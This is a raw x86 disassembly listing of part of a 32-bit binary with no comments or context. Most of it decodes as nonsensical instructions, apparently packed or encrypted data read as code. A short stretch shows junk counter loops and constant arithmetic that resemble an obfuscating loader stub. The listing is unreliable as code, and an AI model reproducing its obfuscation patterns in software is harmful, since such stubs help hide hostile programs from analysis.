  403055:	aad    0x4e
  403057:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403058:	pop    ebx
  403059:	mov    edx,0xf371456e
  40305e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40305f:	clc    
  403060:	push   edx
  403061:	sar    DWORD PTR [edi-0x25be1ace],1
  403067:	mov    edx,0x2f5efc16
  40306c:	and    ebp,ebx
  40306e:	or     BYTE PTR [ebx+0x749d0c22],bl
  403074:	or     ecx,DWORD PTR [ecx-0x31]
  403077:	imul   esp,DWORD PTR [eax+0x11c6eaaf],0x56
  40307e:	mov    ch,0x92
  403080:	mov    eax,ds:0xdc2ef768
  403085:	enter  0xc575,0xbb
  403089:	inc    esi
  40308a:	xchg   ebp,eax
  40308b:	sahf   
  40308c:	sub    BYTE PTR ds:0x4b0ec042,al
  403092:	cmp    eax,DWORD PTR [edx]
  403094:	nop
  403095:	sbb    al,0x25
  403097:	repnz and eax,0xd5c41bf8
  40309d:	pop    edx
  40309e:	mov    esi,0xe53d5751
  4030a3:	jb     0x40303c
  4030a5:	and    BYTE PTR [esi],bh
  4030a7:	pop    es
  4030a8:	xor    eax,0x8bfcd9d3
  4030ad:	adc    DWORD PTR [edi-0xd],esi
  4030b0:	mov    ch,0x38
  4030b2:	(bad)  
  4030b3:	sbb    esi,DWORD PTR [ecx-0x10]
  4030b6:	inc    edx
  4030b7:	jecxz  0x40307f
  4030b9:	xor    DWORD PTR [ebx],esp
  4030bb:	shl    BYTE PTR [esi],1
  4030bd:	in     eax,0x3f
  4030bf:	mov    esp,0xa7bad638
  4030c4:	push   edx
  4030c5:	int3   
  4030c6:	and    BYTE PTR [ebp-0x26dd47a3],cl
  4030cc:	dec    edx
  4030cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4030ce:	loop   0x40307b
  4030d0:	neg    DWORD PTR [eax+0x15360da2]
  4030d6:	ins    BYTE PTR es:[edi],dx
  4030d7:	out    dx,eax
  4030d8:	retf   
  4030d9:	and    al,0xff
  4030db:	ins    BYTE PTR es:[edi],dx
  4030dc:	inc    ebp
  4030dd:	sub    BYTE PTR [ebx+0xbaa52b],al
  4030e3:	jle    0x4030d9
  4030e5:	cwde   
  4030e6:	in     al,dx
  4030e7:	inc    ecx
  4030e8:	std    
  4030e9:	into   
  4030ea:	into   
  4030eb:	stos   BYTE PTR es:[edi],al
  4030ec:	pop    ecx
  4030ed:	es inc edx
  4030ef:	lods   eax,DWORD PTR ds:[esi]
  4030f0:	mov    ah,0x39
  4030f2:	cli    
  4030f3:	cmp    ecx,esp
  4030f5:	jmp    0x9282:0x50a7c052
  4030fc:	adc    DWORD PTR [eax-0x1c],esp
  4030ff:	cwde   
  403100:	push   es
  403101:	jl     0x4030e4
  403103:	mov    ebp,0x7cadaab2
  403108:	repnz mov esp,0x62fd02c9
  40310e:	cmp    eax,DWORD PTR [eax+0x3b]
  403111:	pop    esi
  403112:	adc    ebp,DWORD PTR [edx+0x72fb11eb]
  403118:	test   DWORD PTR [ebx+edi*1-0x2b0161cf],ecx
  40311f:	das    
  403120:	mov    DWORD PTR [edx-0x64],esi
  403123:	or     eax,0xe2b40ad2
  403128:	popf   
  403129:	adc    al,0xb1
  40312b:	pop    ebp
  40312c:	jo     0x403198
  40312e:	mov    esp,0xf3df8cda
  403133:	xor    bh,dh
  403135:	xor    al,0x5b
  403137:	sbb    bh,bh
  403139:	jmp    0xd1fa5dba
  40313e:	sahf   
  40313f:	xchg   ecx,eax
  403140:	dec    ebp
  403141:	jecxz  0x4030c7
  403143:	hlt    
  403144:	mov    ebp,0xb914e4d4
  403149:	pushf  
  40314a:	les    ecx,FWORD PTR [edx+0x6dc8690f]
  403150:	push   0x5398cbf4
  403155:	daa    
  403156:	sbb    BYTE PTR ds:0xbf473d6e,ch
  40315c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40315d:	hlt    
  40315e:	fld    st(2)
  403160:	jge    0x4031b9
  403162:	sub    al,0xff
  403164:	lods   al,BYTE PTR ds:[esi]
  403165:	fs das 
  403167:	enter  0xc516,0xa8
  40316b:	jmp    0x279c1f54
  403170:	mov    bl,0x1
  403172:	(bad)
  403175:	mov    esi,0x44a5241d
  40317a:	sub    edx,DWORD PTR [esi-0x3f]
  40317d:	mov    ds:0x343abe8d,eax
  403182:	out    dx,al
  403183:	cmp    cl,bl
  403185:	retf   0x2c68
  403188:	test   BYTE PTR [eax+0x2a2a1537],0xc5
  40318f:	dec    ecx
  403190:	imul   ecx,DWORD PTR [eax+0x57],0x1acd8d7b
  403197:	sbb    ebp,edx
  403199:	adc    ecx,DWORD PTR [eax]
  40319b:	in     al,dx
  40319c:	cmp    ebp,DWORD PTR [ebx]
  40319e:	test   ch,dl
  4031a0:	bound  edx,QWORD PTR [ebx]
  4031a2:	(bad)  
  4031a3:	arpl   WORD PTR [esi+edx*8+0x63],cx
  4031a7:	cdq    
  4031a8:	add    al,0x7f
  4031aa:	aas    
  4031ab:	pushf  
  4031ac:	push   edi
  4031ad:	xchg   edx,eax
  4031ae:	xor    eax,0x35737ee
  4031b3:	mov    eax,ds:0x105e912f
  4031b8:	jmp    0xb5781a7f
  4031bd:	je     0x403140
  4031bf:	ins    DWORD PTR es:[edi],dx
  4031c0:	out    dx,eax
  4031c1:	xor    DWORD PTR [eax-0x65],0x2
  4031c5:	into   
  4031c6:	jo     0x403199
  4031c8:	lds    esi,FWORD PTR [esi-0x52bf1607]
  4031ce:	fdivp  st(1),st
  4031d0:	fs jne 0x403219
  4031d3:	mov    ds:0xaafeae2a,eax
  4031d8:	inc    DWORD PTR [eax+0xb]
  4031db:	adc    edx,DWORD PTR [ecx-0x5a6127e7]
  4031e1:	jae    0x4031e6
  4031e3:	mov    esi,gs
  4031e5:	jge    0x40319e
  4031e7:	xlat   BYTE PTR ds:[ebx]
  4031e8:	sub    ebx,DWORD PTR ds:0x62159135
  4031ee:	pop    eax
  4031ef:	arpl   WORD PTR [edi+0x18],di
  4031f2:	cmc    
  4031f3:	mov    bl,0x88
  4031f5:	pop    esp
  4031f6:	sbb    BYTE PTR [eax+ecx*2+0x2c],bh
  4031fa:	rol    BYTE PTR [edx],1
  4031fc:	pop    esi
  4031fd:	loope  0x403258
  4031ff:	xchg   ebx,eax
  403200:	adc    BYTE PTR [ecx-0x6e],dl
  403203:	test   DWORD PTR [eax+0x1aab6d92],esp
  403209:	sti    
  40320a:	test   DWORD PTR [eax+0x35],esi
  40320d:	adc    BYTE PTR [edx+0x799ea84a],0xee
  403214:	shl    BYTE PTR [ebx+0x14],0x77
  403218:	test   esi,edx
  40321a:	add    BYTE PTR [ecx-0x3c6721ec],bl
  403220:	or     DWORD PTR gs:[edx+eiz*8+0x4c],edi
  403225:	mov    ds:0xfec06d88,al
  40322a:	lods   al,BYTE PTR ds:[si]
  40322c:	push   0xffffffe0
  40322e:	aaa    
  40322f:	mov    bh,0x5
  403231:	push   edi
  403232:	mov    eax,ds:0xfdec7f92
  403237:	loopne 0x403282
  403239:	ret    0xd91e
  40323c:	dec    esi
  40323d:	or     edi,DWORD PTR [esi]
  40323f:	or     al,0x6d
  403241:	repnz bound eax,QWORD PTR [ecx-0x70]
  403245:	(bad)  
  403247:	out    0x85,eax
  403249:	cs push esi
  40324b:	mov    ah,0xa0
  40324d:	xor    esi,ecx
  40324f:	and    BYTE PTR [esi],cl
  403251:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403252:	addr16 cs dec edi
  403255:	and    BYTE PTR [ebp+0x4a421685],bh
  40325b:	ds cmp eax,0x5848ce2f
  403261:	pop    esi
  403262:	add    DWORD PTR [ecx+0xb],esi
  403265:	loopne 0x4031f1
  403267:	mov    cl,0xad
  403269:	lds    ecx,FWORD PTR [edx]
  40326b:	and    edx,DWORD PTR [ebp-0x4519a8ea]
  403271:	ret    0x90e8
  403274:	ret    0xe1e2
  403277:	sahf   
  403278:	mov    ebx,0x940396e6
  40327d:	push   esp
  40327e:	lock lds edx,FWORD PTR [ecx+0x5b]
  403282:	leave  
  403283:	ret    0xc
  403286:	push   ebp
  403287:	mov    ebp,esp
  403289:	sub    esp,0x14
  40328c:	leave  
  40328d:	ret    0x4
  403290:	push   ebp
  403291:	mov    ebp,esp
  403293:	push   ecx
  403294:	push   ecx
  403295:	neg    ecx
  403297:	mov    eax,0xf89c8535
  40329c:	and    DWORD PTR ds:0x433617,0x0
  4032a6:	mov    edx,DWORD PTR ds:0x433617
  4032ac:	inc    edx
  4032ad:	mov    DWORD PTR ds:0x433617,edx
  4032b3:	cmp    DWORD PTR ds:0x433617,0x6
  4032ba:	jne    0x4032d5
  4032c0:	push   0x8ffb
  4032c5:	push   0x6662
  4032ca:	push   0x4336ed
  4032cf:	call   DWORD PTR ds:0x412180
  4032d5:	cmp    DWORD PTR ds:0x433617,0x5
  4032dc:	jne    0x4032ef
  4032e2:	mov    edx,DWORD PTR ds:0x433617
  4032e8:	inc    edx
  4032e9:	mov    DWORD PTR ds:0x433617,edx
  4032ef:	cmp    DWORD PTR ds:0x433617,0x11
  4032f6:	jb     0x4032a6
  4032fc:	mov    DWORD PTR [ebp-0x8],eax
  4032ff:	sbb    DWORD PTR ds:0x43359b,edi
  403305:	mov    DWORD PTR [ebp-0x4],0xf89c8534
  40330c:	mov    DWORD PTR ds:0x43365b,0x7030
  403316:	mov    edx,DWORD PTR [ebp-0x8]
  403319:	and    DWORD PTR ds:0x4335f3,0x0
  403323:	xor    ecx,ecx
  403325:	or     ecx,DWORD PTR ds:0x4335f3
  40332b:	inc    ecx
  40332c:	mov    DWORD PTR ds:0x4335f3,ecx
  403332:	cmp    DWORD PTR ds:0x4335f3,0x1f
  403339:	jne    0x403361
  40333f:	push   0x433657
  403344:	push   0x433623
  403349:	push   DWORD PTR [ebp-0xc]
  40334c:	push   0x4337cc
  403351:	push   0x4336ca
  403356:	push   0x433767
  40335b:	call   DWORD PTR ds:0x412184
  403361:	cmp    DWORD PTR ds:0x4335f3,0x13
  403368:	jb     0x403323
  40336e:	mov    DWORD PTR ds:0x43355b,0x1f
  403378:	cmp    DWORD PTR ds:0x43355b,0x0
  40337f:	je     0x4033d1
  403385:	cmp    DWORD PTR ds:0x43355b,0x4
  40338c:	jne    0x40339d
  403392:	push   0x4335eb
  403397:	call   DWORD PTR ds:0x412188
  40339d:	cmp    DWORD PTR ds:0x43355b,0x5
  4033a4:	jne    0x4033b9
  4033aa:	xor    ecx,ecx
  4033ac:	xor    ecx,DWORD PTR ds:0x43355b
  4033b2:	dec    ecx
  4033b3:	mov    DWORD PTR ds:0x43355b,ecx
  4033b9:	mov    ecx,DWORD PTR ds:0x43355b
  4033bf:	dec    ecx
  4033c0:	mov    DWORD PTR ds:0x43355b,ecx
  4033c6:	jmp    0x403378
  4033cb:	and    DWORD PTR ds:0x4335e3,ecx
  4033d1:	push   esi
  4033d2:	mov    ecx,0x7510853
  4033d7:	xor    edx,ecx
  4033d9:	mov    esi,0x32729a
  4033de:	adc    DWORD PTR ds:0x43362b,0x4fea
  4033e8:	push   edi
  4033e9:	sub    DWORD PTR ds:0x4335db,0x417a
  4033f3:	mov    edi,DWORD PTR [ebp+0x10]
  4033f6:	add    edx,esi
  4033f8:	cmp    edi,edx
  4033fa:	je     0x403eaf
  403400:	jmp    0x40360c
  403405:	adc    DWORD PTR [edi+0x6fb6ef04],esp
  40340b:	icebp  
  40340c:	popa   
  40340d:	mov    WORD PTR [ebx],?
  40340f:	push   edi
  403410:	inc    esp
  403411:	rcl    DWORD PTR [ebx+0x131678ea],0x7c
  403418:	jl     0x403487
  40341a:	jg     0x403498
  40341c:	jl     0x4033a9
  40341e:	(bad)  
  40341f:	inc    ebp
  403420:	test   BYTE PTR [eax],bh
  403422:	sbb    ecx,DWORD PTR ds:0x4142bae2
  403428:	inc    edi
  403429:	cld    
  40342a:	mov    ebx,0xf7aff215
  40342f:	sub    al,BYTE PTR [edi-0x8820aeb]
  403435:	xor    edi,DWORD PTR [eax+0x3ea6d746]
  40343b:	test   DWORD PTR [edi-0x39857a9],ecx
  403441:	out    dx,eax
  403442:	sbb    eax,0x506aa1d3
  403447:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403448:	sbb    al,0x1a
  40344a:	push   ss
  40344b:	les    esi,FWORD PTR [eax]
  40344d:	cwde   
  40344e:	mov    ah,0xbb
  403450:	outs   dx,BYTE PTR ds:[esi]
  403451:	fld    TBYTE PTR [esi+0x38]
  403454:	ja     0x403482
  403456:	fucomp st(7)
  403458:	add    ebx,DWORD PTR [esi+0x5ec91cb2]
  40345e:	in     eax,0x6d
  403460:	in     eax,0x90
  403462:	ins    DWORD PTR es:[edi],dx
  403463:	xchg   DWORD PTR [ecx-0x41164639],edx
  403469:	jno    0x403440
  40346b:	ins    BYTE PTR es:[edi],dx
  40346c:	lsl    ebx,WORD PTR [edx+0x6201caf2]
  403473:	aas    
  403474:	dec    esp
  403475:	scas   eax,DWORD PTR es:[edi]
  403476:	dec    ebp
  403477:	fs dec ecx
  403479:	xchg   ebp,eax
  40347a:	xchg   ebx,eax
  40347b:	in     eax,dx
  40347c:	fwait
  40347d:	xlat   BYTE PTR ds:[ebx]
  40347e:	or     BYTE PTR [edi*1+0x4d17670e],dh
  403485:	inc    eax
  403486:	loope  0x403412
  403488:	ins    DWORD PTR es:[edi],dx
  403489:	jle    0x4034bd
  40348b:	mov    BYTE PTR [edi-0x3921998c],dh
  403491:	inc    eax
  403492:	aas    
  403493:	pop    edi
  403494:	stos   BYTE PTR es:[edi],al
  403495:	adc    edx,DWORD PTR [ecx]
  403497:	inc    ebx
  403498:	arpl   WORD PTR [edi-0x2a],di
  40349b:	add    cl,dl
  40349d:	psllw  mm5,QWORD PTR [edx+edx*2+0x5a6c720f]
  4034a5:	stos   DWORD PTR es:[edi],eax
  4034a6:	adc    al,0xc5
  4034a8:	bound  esi,QWORD PTR [ebx+0x16b2b5b3]
  4034ae:	in     al,dx
  4034af:	nop
  4034b0:	popa   
  4034b1:	cli    
  4034b2:	ins    DWORD PTR es:[edi],dx
  4034b3:	pop    esp
  4034b4:	sub    al,0xbd
  4034b6:	sbb    ecx,ecx
  4034b8:	test   BYTE PTR [ecx-0x52],dh
  4034bb:	loope  0x4034c4
  4034bd:	out    0x4b,eax
  4034bf:	mov    ?,WORD PTR [edi+0x1288aba8]
  4034c5:	and    al,0x88
  4034c7:	(bad)  [ebx+0x63]
  4034ca:	xchg   BYTE PTR [ecx+edx*8-0x7c],dl
  4034ce:	mul    al
  4034d0:	jae    0x40353d
  4034d2:	and    al,0x81
  4034d4:	mov    bh,0xc8
  4034d6:	adc    BYTE PTR [ecx+ebp*8],bl
  4034d9:	push   esi
  4034da:	mov    bh,0x39
  4034dc:	outs   dx,DWORD PTR ds:[esi]
  4034dd:	mov    ch,0xc2
  4034df:	int3   
  4034e0:	mov    ebx,0x14455ab1
  4034e5:	add    DWORD PTR [eax-0x61],edi
  4034e8:	pop    ebp
  4034e9:	pop    ecx
  4034ea:	test   eax,0xf6ea334f
  4034ef:	cmp    BYTE PTR [edi+0x696d6378],dh
  4034f5:	lods   al,BYTE PTR ds:[esi]
  4034f6:	xchg   ebx,eax
  4034f7:	add    eax,0x6443eec6
  4034fc:	mov    esp,0xa5af48ed
  403501:	(bad)  
  403502:	stos   DWORD PTR es:[edi],eax
  403503:	mov    esp,0x358773a4
  403508:	out    dx,eax
  403509:	add    edi,DWORD PTR [ebx-0x1c]
  40350c:	enter  0xabad,0x19
  403510:	mov    al,0x64
  403512:	ret    
  403513:	les    ebx,FWORD PTR [ebx]
  403515:	popf   
  403516:	dec    ebp
  403517:	mov    ch,0x1f
  403519:	in     al,0xc1
  40351b:	lods   eax,DWORD PTR ds:[esi]
  40351c:	pop    ecx
  40351d:	inc    eax
  40351e:	mov    WORD PTR [esi],fs
  403520:	mov    al,BYTE PTR [esi-0x14dc28d7]
  403526:	arpl   WORD PTR [edi-0xce92554],di
  40352c:	inc    eax
  40352d:	mov    cl,0x4b
  40352f:	jge    0x403546
  403531:	pop    esi
  403532:	outs   dx,BYTE PTR ds:[esi]
  403533:	(bad)  
  403534:	nop
  403535:	pushf  
  403536:	fsub   QWORD PTR [ebx]
  403538:	cld    
  403539:	xor    eax,0xcdaae81f
  40353e:	gs cmp eax,0xd569db20
  403544:	xchg   esp,eax
  403545:	jno    0x40351b
  403547:	mov    bl,0x2a
  403549:	inc    ebp
  40354a:	sbb    dh,BYTE PTR [esi]
  40354c:	add    al,0x32
  40354e:	pop    ebx
  40354f:	push   ss
  403550:	ror    bh,0xf
  403553:	adc    DWORD PTR [eax],eax
  403555:	xchg   ebx,eax
  403556:	xchg   edi,eax
  403557:	sbb    eax,0xe86d644d
  40355c:	sub    eax,0x66fcddac
  403561:	stos   BYTE PTR es:[edi],al
  403562:	or     DWORD PTR [esi-0x49],ecx
  403565:	push   edx
  403566:	xchg   edi,eax
  403567:	jnp    0x40359b
  403569:	sbb    al,0x7a
  40356b:	mov    ds:0x31f7d08b,al
  403570:	dec    BYTE PTR [edx]
  403572:	cmc    
  403573:	xor    ah,bl
  403575:	pop    ecx
  403576:	mov    esi,0xfb3a5edf
  40357b:	dec    esp
  40357c:	mov    ds:0x2fab9be5,eax
  403581:	jle    0x403599
  403583:	jb     0x40350c
  403585:	mov    ds:0xd6c55465,al
  40358a:	jne    0x403528
  40358c:	sbb    bh,BYTE PTR [eax-0x27]
  40358f:	popf   
  403590:	dec    edi
  403591:	inc    edx
  403592:	mov    DWORD PTR [esi+edx*8-0x1e],esi
  403596:	mov    ds:0xad6b8469,al
  40359b:	cs shl esi,0xe6
  40359f:	clc    
  4035a0:	xchg   ecx,eax
  4035a1:	xchg   ecx,eax
  4035a2:	in     eax,dx
  4035a3:	push   ecx
  4035a4:	test   eax,0x3b1d68c3
  4035a9:	mov    esp,0xccf08c59
  4035ae:	arpl   WORD PTR [ecx+0x33],dx
  4035b1:	inc    ecx
  4035b2:	(bad)  
  4035b3:	jb     0x403594
  4035b5:	aaa    
  4035b6:	xchg   ebp,eax
  4035b7:	retf   0x2447
  4035ba:	xchg   edi,eax
  4035bb:	push   0x4e64a584
  4035c0:	cmp    cl,ah
  4035c2:	add    esp,DWORD PTR [edx+0x3e56586a]
  4035c8:	xor    bh,BYTE PTR [edi]
  4035ca:	push   ecx
  4035cb:	idiv   DWORD PTR [ecx-0x3b8d27a1]
  4035d1:	add    eax,DWORD PTR [ebp-0x3d453707]
  4035d7:	jmp    FWORD PTR [ebx+0x6d]
  4035da:	shl    ebp,0x7e
  4035dd:	mov    ch,0x1a
  4035df:	out    dx,eax
  4035e0:	mov    esp,0x87a8f329
  4035e5:	(bad)  
  4035e6:	jno    0x403609
  4035e8:	add    al,0xf
  4035ea:	sub    ch,al
  4035ec:	aas    
  4035ed:	inc    eax
  4035ee:	mov    edx,DWORD PTR [ebp+0x53]
  4035f1:	sbb    ah,ah
  4035f3:	or     ecx,esi
  4035f5:	xchg   ebx,eax
  4035f6:	inc    ecx
  4035f7:	pop    ebx
  4035f8:	aaa    
  4035f9:	cmp    eax,0x7916891f
  4035fe:	push   esi
  4035ff:	or     eax,0x9dfab222
  403604:	imul   esi,DWORD PTR [edx],0x82f22730
  40360a:	adc    bh,bh
  40360c:	mov    edx,DWORD PTR [ebp-0x8]
  40360f:	mov    eax,DWORD PTR [ebp-0x4]
  403612:	xor    eax,ecx
  403614:	mov    edi,0xffcd8d66
  403619:	sub    edi,eax
  40361b:	add    edi,DWORD PTR [ebp+0x10]
  40361e:	xor    edx,ecx
  403620:	add    edx,esi
  403622:	cmp    edx,edi
  403624:	ja     0x403eaa
  40362a:	push   ebx
  40362b:	jmp    0x403841
  403630:	mov    esi,0x32729a
  403635:	jmp    0x403841
  40363a:	sbb    dh,BYTE PTR [eax+ebx*8+0x727272b6]
  403641:	mov    al,0x9c
  403643:	outs   dx,DWORD PTR ds:[esi]
  403644:	call   0x5b041a76
  403649:	ja     0x403652
  40364b:	sbb    eax,0x7f6d7c7c
  403650:	jl     0x4036ce
  403652:	cld    
  403653:	adc    bh,bh
  403655:	mov    ebp,0xf1b66386
  40365a:	lds    ecx,FWORD PTR [eax+0x6e3d07da]
  403660:	pop    es
  403661:	mov    ah,0xcf
  403663:	push   edx
  403664:	mov    ebx,0x95f0c9a
  403669:	in     al,0x38
  40366b:	daa    
  40366c:	or     eax,0x69cba6b8
  403671:	sbb    eax,0x472fdc3c
  403676:	push   edi
  403677:	jle    0x4036c6
  403679:	pop    ds
  40367a:	push   ebp
  40367b:	into   
  40367c:	test   al,0x25
  40367e:	into   
  40367f:	js     0x403688
  403681:	frstor [eax-0x7d]
  403684:	cli    
  403685:	sbb    DWORD PTR [edi],esp
  403687:	dec    BYTE PTR [edx]
  403689:	les    bp,DWORD PTR [esi+0x6316502b]
  403690:	stc    
  403691:	mov    edi,0xcbf0ac45
  403696:	dec    BYTE PTR [ebx+0x59c6eded]
  40369c:	inc    ebp
  40369d:	mov    ds:0xe18e5beb,eax
  4036a2:	test   DWORD PTR [edi+0x799e325e],edx
  4036a8:	hlt    
  4036a9:	pop    ebx
  4036aa:	push   ebp
  4036ab:	push   es
  4036ac:	xchg   edx,eax
  4036ad:	inc    eax
  4036ae:	aaa    
  4036af:	lahf   
  4036b0:	test   edx,edx
  4036b2:	(bad)  
  4036b3:	cdq    
  4036b4:	aas    
  4036b5:	in     al,dx
  4036b6:	sbb    ecx,ebx
  4036b8:	mov    edi,0x9a0ab3e0
  4036bd:	ins    BYTE PTR es:[edi],dx
  4036be:	jle    0x4036f9
  4036c0:	and    esp,DWORD PTR [eax]
  4036c2:	sbb    DWORD PTR [ebx],ecx
  4036c4:	xchg   esp,eax
  4036c5:	xlat   BYTE PTR ds:[ebx]
  4036c6:	pop    ebx
  4036c7:	adc    bl,BYTE PTR [ebp+esi*8+0x20]
  4036cb:	ins    BYTE PTR es:[edi],dx
  4036cc:	jmp    0x3607603b
  4036d1:	xor    BYTE PTR [edx-0x4b20189],cl
  4036d7:	sbb    ebp,DWORD PTR [esi]
  4036d9:	lods   al,BYTE PTR ds:[esi]
  4036da:	je     0x403758
  4036dc:	jp     0x40371a
  4036de:	push   0xa252b735
  4036e3:	pusha  
  4036e4:	mov    dh,0x7f
  4036e6:	hlt    
  4036e7:	scas   eax,DWORD PTR es:[edi]
  4036e8:	pop    ecx
  4036e9:	push   ebx
  4036ea:	out    dx,eax
  4036eb:	data16 es aaa 
  4036ee:	test   eax,0x941fa4ff
  4036f3:	and    BYTE PTR [edx-0x3d5ad92f],bl
  4036f9:	xchg   esi,eax
  4036fa:	pop    ss
  4036fb:	xchg   esi,eax
  4036fc:	push   eax
  4036fd:	xchg   edx,eax
  4036fe:	sahf   
  4036ff:	fidiv  WORD PTR [ebx]
  403701:	mov    esi,ebx
  403703:	lds    edi,FWORD PTR [eax+0x55]
  403706:	shr    DWORD PTR [ecx+0x30],1
  403709:	add    DWORD PTR [ecx],eax
  40370b:	xchg   esp,eax
  40370c:	(bad)  
  40370d:	in     al,0x78
  40370f:	fwait
  403710:	repz (bad) 
  403713:	mov    ebp,0xcd42eb0
  403718:	stos   BYTE PTR es:[edi],al
  403719:	cli    
  40371a:	into   
  40371b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40371c:	call   ebp
  40371e:	fldcw  WORD PTR [edi+0x4]
  403721:	dec    esp
  403722:	mov    eax,ds:0x35333171
  403727:	aaa    
  403728:	loop   0x40378b
  40372a:	je     0x4037ab
  40372c:	repz xor esp,edi
  40372f:	enter  0x3b8b,0xa8
  403733:	mov    eax,0x57826b38
  403738:	xchg   ecx,eax
  403739:	dec    ebx
  40373a:	jmp    0x403702
  40373c:	mov    bh,dh
  40373e:	jp     0x40371b
  403740:	cmp    edi,DWORD PTR [ebp-0x2d]
  403743:	stc    
  403744:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403745:	rcl    esi,cl
  403747:	jns    0x4037c0
  403749:	scas   al,BYTE PTR es:[edi]
  40374a:	and    DWORD PTR [edx],edi
  40374c:	mov    BYTE PTR [edi-0x76],ch
  40374f:	inc    edi
  403750:	test   BYTE PTR [edx+0x49bc5683],ah
  403756:	and    esp,DWORD PTR [esi-0x75]
  403759:	xor    al,0xa9
  40375b:	xor    eax,eax
  40375d:	pop    ebp
  40375e:	mov    fs,WORD PTR [edi-0xdaf682b]
  403764:	fistp  DWORD PTR [esi]
  403766:	inc    esp
  403767:	and    DWORD PTR [edx-0xf534e5b],0xffffff99
  40376e:	mov    ch,0xbd
  403770:	dec    esp
  403771:	nop
  403772:	rcl    BYTE PTR [ecx],cl
  403774:	hlt    
  403775:	in     al,0xc6
  403777:	sub    ecx,DWORD PTR [ecx+0x73018fa5]
  40377d:	jnp    0x403793
  40377f:	jne    0x40374f
  403781:	pop    ds
  403782:	inc    eax
  403783:	jae    0x40372f
  403785:	clc    
  403786:	mov    edi,0xce7879db
  40378b:	jge    0x4037c1
  40378d:	sar    DWORD PTR [eax-0x355f5873],0xb1
  403794:	mov    ds:0x7eabfdee,al
  403799:	(bad)  
  40379a:	fcmovb st,st(0)
  40379c:	gs inc edi
  40379e:	outs   dx,BYTE PTR ds:[esi]
  40379f:	jbe    0x4037f9
  4037a1:	adc    al,0x19
  4037a3:	cmc    
  4037a4:	mov    edi,0xab53b870
  4037a9:	gs dec ebp
  4037ab:	inc    esi
  4037ac:	adc    al,0x86
  4037ae:	arpl   dx,sp
  4037b0:	dec    edi
  4037b1:	in     al,dx
  4037b2:	clc    
  4037b3:	std    
  4037b4:	ficom  WORD PTR [edx]
  4037b6:	int3   
  4037b7:	jns    0x40378a
  4037b9:	sbb    DWORD PTR [edi-0x6a45045e],0xbacefc80
  4037c3:	add    ch,bh
  4037c5:	push   esp
  4037c6:	mul    cl
  4037c8:	popa   
  4037c9:	enter  0x7eff,0x86
  4037cd:	call   0xa82d:0x3669b75f
  4037d4:	rcr    BYTE PTR [edi-0x5f4773e7],1
  4037da:	fiadd  WORD PTR [ebx]
  4037dc:	xor    BYTE PTR [esi-0x3bf9d53],dh
  4037e2:	cs add cl,dl
  4037e5:	jle    0x40381a
  4037e7:	test   DWORD PTR [ebx],esp
  4037e9:	cmp    BYTE PTR [esi-0x17bc760d],0xf1
  4037f0:	dec    edi
  4037f1:	xor    DWORD PTR [esi+edx*4+0x1a93b968],eax
  4037f8:	mov    edx,0x699094ee
  4037fd:	lods   al,BYTE PTR ds:[esi]
  4037fe:	and    dh,BYTE PTR [edx+0x5c]
  403801:	int    0xca
  403803:	je     0x40386f
  403805:	jp     0x403823
  403807:	adc    eax,0x900eb10c
  40380c:	stos   BYTE PTR es:[edi],al
  40380d:	in     eax,dx
  40380e:	mul    BYTE PTR [eax]
  403810:	rol    DWORD PTR [ebx],0x30
  403813:	and    BYTE PTR [ebp-0x27],dh
  403816:	cli    
  403817:	adc    edx,DWORD PTR ds:0x1fb5ffd6
  40381d:	mov    ch,0x2d
  40381f:	inc    ecx
  403820:	shl    DWORD PTR [ebp+0x4],1
  403823:	fisub  WORD PTR [ebp+edx*2-0x3e]
  403827:	add    edi,DWORD PTR [edi]
  403829:	sub    dh,cl
  40382b:	inc    ecx
  40382c:	mov    ebx,0x9691569e
  403831:	popf   
  403832:	dec    ebp
  403833:	sbb    al,0xd8
  403835:	cdq    
  403836:	jp     0x403890
  403838:	popa   
  403839:	adc    eax,DWORD PTR [edx+0x1e7ce090]
  40383f:	(bad)  
  403840:	jne    0x4037cd
  403842:	inc    ebp
  403843:	clc    
  403844:	jmp    0x403a50
  403849:	sar    BYTE PTR [esi+0x5d5dd03b],1
  40384f:	sar    DWORD PTR [esi+0x4bfdbe82],cl
  403855:	sti    
  403856:	lahf   
  403857:	jae    0x403861
  403859:	je     0x403877
  40385b:	jl     0x4038d9
  40385d:	ins    DWORD PTR es:[edi],dx
  40385e:	jg     0x4038dc
  403860:	jl     0x403804
  403862:	xchg   esp,eax
  403863:	dec    esi
  403864:	push   ebx
  403865:	add    esp,DWORD PTR [esi-0x3605d6ba]
  40386b:	ret    0x95d1
  40386e:	push   ss
  40386f:	mov    edx,0x1db922c3
  403874:	fmul   QWORD PTR ds:0x8b2772b7
  40387a:	cli    
  40387b:	mov    al,0x3e
  40387e:	in     eax,0xc4
  403880:	int    0xf9
  403882:	mov    ds:0xd8151b,eax
  403887:	mov    esp,esp
  403889:	ins    BYTE PTR es:[edi],dx
  40388a:	add    eax,0x49a64e93
  40388f:	inc    eax
  403890:	arpl   ax,bx
  403892:	(bad)  
  403894:	fisttp WORD PTR [edx-0x75cbdee0]
  40389a:	xchg   DWORD PTR [ecx+0x56f83bb8],edi
  4038a0:	add    BYTE PTR [ebx+0x67],cl
  4038a3:	cmp    al,0xbb
  4038a5:	pusha  
  4038a6:	retf   0xa5c
  4038a9:	hlt    
  4038aa:	pop    eax
  4038ab:	(bad)  
  4038ac:	loopne 0x40385e
  4038ae:	clc    
  4038af:	xchg   ecx,eax
  4038b0:	out    dx,al
  4038b1:	pop    es
  4038b2:	faddp  st(5),st
  4038b4:	mov    bh,0x41
  4038b6:	push   ebp
  4038b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4038b8:	lahf   
  4038b9:	aas    
  4038ba:	pop    edx
  4038bb:	(bad)  
  4038bd:	add    BYTE PTR [eax+0x4971cae4],dh
  4038c3:	pop    ecx
  4038c4:	fwait
  4038c5:	call   0x9e48bc20
  4038ca:	ss jo  0x403909
  4038cd:	rol    BYTE PTR [ecx-0x59],0x3d
  4038d1:	push   ebp
  4038d2:	jmp    FWORD PTR [esp+esi*2+0x72]
  4038d6:	sub    al,0xcb
  4038d8:	adc    ah,0x0
